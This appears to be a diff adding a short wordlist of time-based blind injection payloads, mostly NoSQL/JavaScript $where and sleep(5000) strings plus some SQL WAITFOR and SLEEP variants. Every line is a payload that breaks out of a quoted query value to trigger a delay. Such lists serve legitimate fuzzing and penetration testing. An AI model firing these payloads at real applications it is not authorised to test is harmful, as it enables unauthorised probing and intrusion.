@@ -1,0 +1,19 @@
+' && sleep(5000) && '1'=='1
+' || sleep(5000) || '1'=='1
+' && this.sleep(5000) && '1'=='1
+';sleep(5000);'
+1' && sleep(5000) && '1
+1' || sleep(5000) || '1
+{$where: "sleep(5000)"}
+{$where: "this.sleep(5000)"}
+{$where: "1;sleep(5000)"}
+;sleep(5000);
+' && function(){ sleep(5000) }() && '1'=='1
+' || function(){ sleep(5000) }() || '1'=='1
+' WAITFOR 5000 --
+' WAIT 5000 --
+' && SLEEP(5000) --
+' OR SLEEP(5000) --
+' && DELAY(5000) --
+1' && WAITFOR 5000 --
+1' OR WAITFOR 5000 --
